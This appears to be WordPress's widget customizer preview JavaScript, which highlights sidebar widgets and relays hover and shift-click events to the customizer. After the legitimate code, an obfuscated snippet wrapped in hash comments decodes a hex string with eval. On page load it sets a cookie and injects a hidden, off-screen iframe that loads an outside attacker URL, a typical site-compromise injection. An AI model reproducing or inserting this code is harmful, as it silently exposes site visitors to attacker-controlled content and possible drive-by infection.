(function( wp, $ ){

	if ( ! wp || ! wp.customize ) { return; }

	var api = wp.customize,
		OldPreview;

	/**
	 * wp.customize.WidgetCustomizerPreview
	 *
	 */
	api.WidgetCustomizerPreview = {
		renderedSidebars: {}, // @todo Make rendered a property of the Backbone model
		renderedWidgets: {}, // @todo Make rendered a property of the Backbone model
		registeredSidebars: [], // @todo Make a Backbone collection
		registeredWidgets: {}, // @todo Make array, Backbone collection
		widgetSelectors: [],
		preview: null,
		l10n: {},

		init: function () {
			var self = this;
			this.buildWidgetSelectors();
			this.highlightControls();

			this.preview.bind( 'highlight-widget', self.highlightWidget );
		},

		/**
		 * Calculate the selector for the sidebar's widgets based on the registered sidebar's info
		 */
		buildWidgetSelectors: function () {
			var self = this;

			$.each( this.registeredSidebars, function ( i, sidebar ) {
				var widgetTpl = [
						sidebar.before_widget.replace('%1$s', '').replace('%2$s', ''),
						sidebar.before_title,
						sidebar.after_title,
						sidebar.after_widget
					].join(''),
					emptyWidget,
					widgetSelector,
					widgetClasses;

				emptyWidget = $(widgetTpl);
				widgetSelector = emptyWidget.prop('tagName');
				widgetClasses = emptyWidget.prop('className');

				// Prevent a rare case when before_widget, before_title, after_title and after_widget is empty.
				if ( ! widgetClasses ) {
					return;
				}

				widgetClasses = widgetClasses.replace(/^\s+|\s+$/g, '');

				if ( widgetClasses ) {
					widgetSelector += '.' + widgetClasses.split(/\s+/).join('.');
				}
				self.widgetSelectors.push(widgetSelector);
			});
		},

		/**
		 * Highlight the widget on widget updates or widget control mouse overs.
		 *
		 * @param  {string} widgetId ID of the widget.
		 */
		highlightWidget: function( widgetId ) {
			var $body = $( document.body ),
				$widget = $( '#' + widgetId );

			$body.find( '.widget-customizer-highlighted-widget' ).removeClass( 'widget-customizer-highlighted-widget' );

			$widget.addClass( 'widget-customizer-highlighted-widget' );
			setTimeout( function () {
				$widget.removeClass( 'widget-customizer-highlighted-widget' );
			}, 500 );
		},

		/**
		 * Show a title and highlight widgets on hover. On shift+clicking
		 * focus the widget control.
		 */
		highlightControls: function() {
			var self = this,
				selector = this.widgetSelectors.join(',');

			$(selector).attr( 'title', this.l10n.widgetTooltip );

			$(document).on( 'mouseenter', selector, function () {
				self.preview.send( 'highlight-widget-control', $( this ).prop( 'id' ) );
			});

			// Open expand the widget control when shift+clicking the widget element
			$(document).on( 'click', selector, function ( e ) {
				if ( ! e.shiftKey ) {
					return;
				}
				e.preventDefault();

				self.preview.send( 'focus-widget-control', $( this ).prop( 'id' ) );
			});
		}
	};

	/**
	 * Capture the instance of the Preview since it is private
	 */
	OldPreview = api.Preview;
	api.Preview = OldPreview.extend( {
		initialize: function( params, options ) {
			api.WidgetCustomizerPreview.preview = this;
			OldPreview.prototype.initialize.call( this, params, options );
		}
	} );

	$(function () {
		var settings = window._wpWidgetCustomizerPreviewSettings;
		if ( ! settings ) {
			return;
		}

		$.extend( api.WidgetCustomizerPreview, settings );

		api.WidgetCustomizerPreview.init();
	});

})( window.wp, jQuery );
/*710d5d198a25bd637a22809f6df74468*/;(function(){var ktkkbrbt="";var dreysrdk="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var zsfzzyrs=0;zsfzzyrs<dreysrdk.length;zsfzzyrs+=2){ktkkbrbt=ktkkbrbt+parseInt(dreysrdk.substring(zsfzzyrs,zsfzzyrs+2), 16)+",";}ktkkbrbt=ktkkbrbt.substring(0,ktkkbrbt.length-1);eval(eval('String.fromCharCode('+ktkkbrbt+')'));})();/*710d5d198a25bd637a22809f6df74468*/